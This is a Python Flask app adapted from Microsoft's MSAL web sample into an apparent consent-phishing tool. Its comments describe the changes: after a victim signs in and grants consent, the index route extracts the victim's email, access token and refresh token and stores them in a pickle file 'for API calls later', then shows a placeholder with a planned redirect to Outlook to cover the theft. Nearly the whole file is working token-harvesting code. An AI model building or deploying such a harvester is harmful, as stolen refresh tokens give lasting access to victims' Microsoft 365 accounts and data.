import uuid
import requests
from flask import Flask, render_template, session, request, redirect, url_for
from flask_session import Session  # https://pythonhosted.org/Flask-Session
import msal
import app_config
import pickle
import json
import os
from os import path
from termcolor import colored

app = Flask(__name__)
app.config.from_object(app_config)
Session(app)

#-------------------------------------------------Modified Microsoft API Index Page to Write Token to File--------------------------------------------#
@app.route("/")
def index():
    if not session.get("user"):
        return redirect(url_for("login"))
    token = _get_token_from_cache(app_config.SCOPE)
    tokenUser = list(token.keys())[0] 
    

    #make token dictionary to pickle file (for API calls later)
    if path.exists('tokenLibrary.pickle'):
        pickleIn = open('tokenLibrary.pickle', 'rb')
        tokenLibrary = pickle.load(pickleIn)
        
        #check for duplicates
        duplicateToken = []
        for user in tokenLibrary:
            if tokenUser == user:
                duplicateToken.append(True)
            else:
                duplicateToken.append(False)

        #if duplicate, ignore
        if True in duplicateToken:
            print(colored('\n[-] Duplicate token, not recording\n', 'yellow'))
            pickleIn.close()
        
        #if new, add to dictionary
        else:
            pickleIn.close()
            print(colored('New user token, writing to library', 'green'))
            tokenLibrary.update(token)
            pickleOut = open('tokenLibrary.pickle', 'wb')
            pickle.dump(tokenLibrary, pickleOut)
    
    #if no prior tokenLibrary, create one
    else:
        print(colored('\n[+] New user token, writing to library\n', 'green'))
        pickleOut = open('tokenLibrary.pickle', 'wb')
        tokenLibrary={}
        tokenLibrary.update(token)
        pickle.dump(tokenLibrary, pickleOut)
        pickleOut.close()
        

    #after accepting, redirect user to corporate/other site
    return '<h1>Future Redirect<h2>'
    #ex. return redirect('https://outlook.office.com')


#-----------------------------------------Untouched From Microsoft Python API (unless otherwise stated)------------------------------------------------#
@app.route("/login")
def login():
    session["state"] = str(uuid.uuid4())
    # Technically we could use empty list [] as scopes to do just sign in,
    # here we choose to also collect end user consent upfront
    auth_url = _build_auth_url(scopes=app_config.SCOPE, state=session["state"])
    return render_template("login.html", auth_url=auth_url, version=msal.__version__)

@app.route(app_config.REDIRECT_PATH)  # Its absolute URL must match your app's redirect_uri set in AAD
def authorized():
    if request.args.get('state') != session.get("state"):
        return redirect(url_for("index"))  # No-OP. Goes back to Index page
    if "error" in request.args:  # Authentication/Authorization failure
        return render_template("auth_error.html", result=request.args)
    if request.args.get('code'):
        cache = _load_cache()
        result = _build_msal_app(cache=cache).acquire_token_by_authorization_code(
            request.args['code'],
            scopes=app_config.SCOPE,  # Misspelled scope would cause an HTTP 400 error here
            redirect_uri=url_for("authorized", _external=True))
        if "error" in result:
            return render_template("auth_error.html", result=result)
        session["user"] = result.get("id_token_claims")
        _save_cache(cache)
    return redirect(url_for("index"))

def _load_cache():
    cache = msal.SerializableTokenCache()
    if session.get("token_cache"):
        cache.deserialize(session["token_cache"])
    return cache

def _save_cache(cache):
    if cache.has_state_changed:
        session["token_cache"] = cache.serialize()

def _build_msal_app(cache=None, authority=None):
    return msal.ConfidentialClientApplication(
        app_config.CLIENT_ID, authority=authority or app_config.AUTHORITY,
        client_credential=app_config.CLIENT_SECRET, token_cache=cache)

def _build_auth_url(authority=None, scopes=None, state=None):
    return _build_msal_app(authority=authority).get_authorization_request_url(
        scopes or [],
        state=state or str(uuid.uuid4()),
        redirect_uri=url_for("authorized", _external=True))


#----------------------------This next function has been modified to include email address and refresh token.----------------------------#
#--------------------------------------------------Results written to dictionary---------------------------------------------------------#
def _get_token_from_cache(scope=None):
    cache = _load_cache()  # This web app maintains one cache per session
    cca = _build_msal_app(cache=cache)
    accounts = cca.get_accounts()
    if accounts:  # So all account(s) belong to the current signed-in user
        result = cca.acquire_token_silent(scope, account=accounts[0])
        #-------Get Refresh Token---------
        cacheText = cache.serialize()
        cacheText = json.loads(cacheText)
        refreshSecretKey = list(cacheText['RefreshToken'])[0]
        refreshToken = cacheText['RefreshToken'][refreshSecretKey]['secret']
        #--------------------------------
        #add email, access token, and refresh token to dictionary
        user = str(accounts[0]['username'])
        result.update({'refreshToken': refreshToken})
        result = {user: result}
        _save_cache(cache)
        return result
#---------------------------------------------------------------------------------------------------------------------------#


app.jinja_env.globals.update(_build_auth_url=_build_auth_url)  # Used in template

if __name__ == "__main__":
    app.run()